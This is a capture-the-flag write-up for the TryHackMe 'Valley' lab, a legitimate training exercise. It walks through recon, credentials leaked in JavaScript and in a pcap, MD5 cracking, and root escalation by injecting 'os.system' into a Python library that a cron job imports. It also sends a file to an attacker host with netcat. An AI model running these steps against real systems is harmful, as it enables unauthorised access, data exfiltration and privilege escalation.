---
tags:
  - THM
  - Linux
  - Easy
  - IDOR
  - Leakage
  - File-Analysis
  - Brute-Force
  - Cron
  - Lib-HJ
---
https://tryhackme.com/room/valleype/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.45.186 valley.thm
```
# Scanning
```console
$ nmap -p22,80,37370 -sV -sC valley.thm

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## Website
In the website, the [gallery section](http://valley.thm/gallery/gallery.html) contains images with predictable names like:
- http://valley.thm/static/1
- http://valley.thm/static/2
- http://valley.thm/static/3

Found note from **user valleyDev**:
```console
$ curl -s http://valley.thm/static/00

dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```
Found login page at [/dev1243224123123](http://valley.thm/dev1243224123123). Then, found credentials of **user siemDev** inside a loaded JavaScript file.
`curl -s http://valley.thm/dev1243224123123/dev.js | tail -n 12`:
```javascript
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```
Found another note for developers after login:
```console
$ curl -s http://valley.thm/dev1243224123123/devNotes37370.txt

dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```
## FTP
Log in via FTP as **user siemDev**:
```console
$ ftp -i valley.thm 37370

Connected to valley.thm.
220 (vsFTPd 3.0.3)
Name (valley.thm:kali): siemDev
331 Please specify the password.
Password: california
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
Download all PcapNG files:
```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.

ftp> mget *
```
After uploading `siemHTTP2.pcapng` file to [A-Packets](https://apackets.com/upload) and filtering for POST requests in the [HTTP section](https://apackets.com/pcaps/flows), found **user valleyDev** credentials:
```text
uname=valleyDev&psw=ph0t0s1234&remember=on
```
# Exploitation
Log in as **user valleyDev** via SSH:
```bash
ssh valleyDev@valley.thm
```
Get the **user flag**:
```bash
cat /home/valleyDev/user.txt
```
# Post-Exploitation
## Executable Analysis
Found `/home/valleyAuthenticator` **executable**:
```console
$ ls -l /home

total 744
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
```
Wait for file transfer from the attacker's machine:
```bash
nc -lvnp <PORT> > /tmp/valleyAuthenticator
```
Send **executable file** from the victim's machine:
```bash
nc <ATTACKER-IP> <PORT> < /home/valleyAuthenticator
```
The **executable** was compressed with UPX:
```console
$ strings /tmp/valleyAuthenticator | tail

n.f<Zov
2.eh+Y.m
gcc!C
ot	3rKH+O
.bss
0nent;
N.vA
 -\(
UPX!
UPX!
```
Found **MD5 hashes** after decompression:
```console
$ upx -d /tmp/valleyAuthenticator > /dev/null

$ strings /tmp/valleyAuthenticator | grep -C 5 pass
tKU1
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
basic_string::_M_construct null not valid
%02x
basic_string::_M_construct null not valid
```
## Brute-Forcing Hashes
Created file `/tmp/hashes.txt` containing the **MD5 hashes**:
```text
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
```
Found **user valley** credentials by brute-forcing:
```console
$ hashcat -a 0 -m 0 --quiet /tmp/hashes.txt /usr/share/dict/rockyou.txt

dd2921cc76ee3abfd2beb60709056cfb:valley
e6722920bab2326f8217e4bf6b1b58ac:liberty123
```
Log in via SSH as **user valley**:
```bash
ssh valley@valley.thm
```
## Abusing Cron Job
Found **user root** running `python3 /photos/script/photosEncrypt.py` as crontab:
```console
$ grep root /etc/crontab

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```
The script calls for the **base64 Python library**.
`cat /photos/script/photosEncrypt.py`:
```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	 output_file.write(encoded_image_data)
```
**Group valleyAdmin** can modify the **base64 Python library**:
```
$ ls -l /usr/lib/python3.8/base64.py

-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```
**User valley** is in **group valleyAdmin**:
```console
$ id

uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```
At the beginning of `/usr/lib/python3.8/base64.py`, add the next lines of code to enable SUID permission to the Bash binary:
```python
import os
os.system("chmod u+s /bin/bash")
```
Wait for the cron job to get executed, then spawn a root shell from Bash:
```bash
/bin/bash -p
```
Get the **root flag**:
```bash
cat /root/root.txt
```